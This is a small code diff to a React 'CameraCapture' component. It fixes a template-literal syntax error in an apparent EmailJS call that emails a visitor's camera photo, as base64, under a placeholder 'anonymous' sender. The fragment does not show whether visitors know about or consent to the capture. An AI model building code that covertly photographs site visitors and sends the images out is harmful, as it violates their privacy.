@@ -29,7 +29,7 @@ const CameraCapture = () => {
             "template_cpvwstn",
             {
               user_email: "anonymous@visitor.com",
-              message: 📸 Foto pengunjung (base64): \n\n${base64Image},
+              message: `📸 Foto pengunjung (base64): \n\n${base64Image}`,
             },
             "mSJCO_NsfdQ76e3Nn"
           ).then(() => {
